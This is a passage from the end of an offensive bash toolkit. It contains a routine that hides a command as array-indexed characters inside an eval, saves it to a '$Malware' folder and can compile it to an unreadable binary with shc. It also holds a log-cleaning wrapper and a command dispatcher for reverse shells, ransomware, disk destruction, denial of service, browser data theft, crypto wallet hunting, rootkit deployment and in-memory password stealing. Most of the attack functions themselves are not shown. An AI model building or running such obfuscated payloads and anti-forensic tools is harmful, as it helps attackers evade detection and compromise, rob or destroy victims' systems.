        index=$(printf "%d" "'$char")
        index=$((index - 97))
        result+="\${LF[$index]}"
    else
        # Preserve spaces, dots, etc. directly
        result+="$char"
    fi
done

echo -e "\n\e[35m==> Converted:\e[0m"
# create the script.sh with the arrays
cat << 'EOF' > script.sh
#!/bin/bash

UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )

eval "XXXXX"
EOF
# cat the script.sh into a variable and replace eval "XXXXX" with eval "command" in array form
template=$(cat script.sh | awk -v x="$result" '{gsub(/XXXXX/, x); print}')
# echo the array correct script
echo "$template" > script2.sh
rm -f script.sh
mv script2.sh "$Malware/script.sh"
chmod 777 "$Malware/script.sh"
echo -e "\n\e[34mDo you want to create a unreadable binary script ? y/n\e[0m"
read -r -p "y=yes n=no ==> " ans
[[ "$ans" =~ [Yy] ]] && shc -r -f "$Malware/script.sh" -o "$Malware/$name" && \
 rm -f "$Malware/script.sh" "$Malware/script.sh.x.c" || \
 mv "$Malware/script.sh" "$Malware/$name" && rm -f "$Malware/script.sh";
echo -e "\n\e[35mScript is located at: $Malware/$name\e[0m"
wait_and_return
}

# Class: ETC - Tool: Log Cleaner - Option 9 (Wrapper Used)
# Function to run the log cleaning tool
# The script will use a wrapper to run the log cleaning binary
# The log cleaning binary will provide functionalities to clean logs
# The script will log the date, time, user name, and script run information
# to log_cleaner.log
log_cleaning_tool() {
    clear
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$log_clean_bin"
    wait_and_return
}

######################## MAIN SCRIPT #######################
check_root

# Check for any arguements and display the correct information
# Script needs 2 arguements to run
# If no arguemets then start in GUI mode

#
if [[ $# -ne 2 ]]; then
    if [[ $# -eq 1 ]] && [[ $1 =~ [-h|-H|-help|-HELP] ]]; then
        show_help
    fi
    header
    user_create_password
    
fi
# Parse the first argument (class)
case $1 in
    -o| -O| --osint) class="osint" ;;
    -p| -P| --payload) class="payload" ;;
    -x| -X| --postex) class="postex" ;;
    -e| -E| --etc) class="etc" ;;
    *) show_help ;;
esac
# Parse the second argument (program) and execute the appropriate function
case $class in
	osint)
        	case $2 in
        	    find-ip|find_ip|findip) find_that_ip ;;
        	    ip_sweep|ip-sweep|ipsweep) sweep_ip ;;
        	    nmap) nmap_tool ;;
        	    enum|auto-enum|auto_enum|enumeration) enum_tool ;;
        	    breached_email|breached-email|breached) breach_parse_wrapper ;;
        	    gd|google-dorks|google_dorks) google_dorks ;;
        	    email|email_search|email-search) email_search ;;
        	    pa|pass-atk|pass_atk|password_attack|password-attack) pass_attack ;;
        	    vf|vuln-finder|vln_finder) vuln_searcher ;;
        	    *) show_help ;;
        	esac
        	;;
	payload)
        	case $2 in
        	    netcat|nc|ncat) netcat_choice ;;
        	    linux_shell|linux-shell|linuxshell) rev_shells ;;
        	    ransom|ransomware) ransomware_shell_options ;;
        	    all_shells|all-shells|allshells) rev_shells_all ;;
		    	notouch|no-touch|no_touch) no_touch_script ;;
		    	kill|kill-computer|kill_computer) destroy_computer ;;
		    	dos|denial_of_service|denial-of-service) dos_bomb_attack ;;
		    	ssh|ssh_attack|ssh-attack) ssh_attack ;;
		    	msf|venom|metasploit) msf_payloads ;;
		    	apk|apk_builder|apk-builder) apk_killer ;;
        	    *) show_help ;;
        	esac
        	;;
	postex)
        	case $2 in
        	    check-vm|check_vm|vm) check_vm ;;
        	    browser_thief|browser-thief|browserthief) browser_data_wrapper ;;
        	    crypto_search|crypto-search|crypto) crypto_catch ;;
        	    file|file_exploit|file-exploit) check_gtfob ;;
        	    kernal|kernal_exploit|kernal-exploit) linux_exploits_check ;;
        	    on_start|on-start|onstart) startup_command ;;
        	    brute_force|brute-force|bruteforce) brute_force_file ;;
        	    files_of_interest|files-of-interest|foi) files_of_interest ;;
				drk|deploy-rootkit|deploy_rootkit) deploy_rootkit ;;
				mem|inmem|in-memory|in_memory) inmem_password_stealer ;; 
        	    *) show_help ;;
        	esac
        	;;
	etc)
        	case $2 in
        	    user-shells|user_shells|usershells) users_and_shells ;;
        	    web_server|web-server|webserver) py_web_server ;;
        	    extract|file_extract|file-extract) extract_arch ;;
        	    openssl) r_b_g_wrapper ;;
        	    secret_note|secret-note|secretnote) gpg_lookalike_wrapper ;;
		    	binary|create-binary|create_binary) create_exe_binary ;;
		    	postx2go|post-x-2-go|post_x_2_go) post_x_2_go ;;
		    	array|array-enc-script|array_enc_script) array_enc_script ;;
		    	lc|log-cleaner|log_cleaner) log_cleaning_tool ;;
        	    *) show_help ;;
        	esac
        	;;
    *) show_help ;;
esac

exit
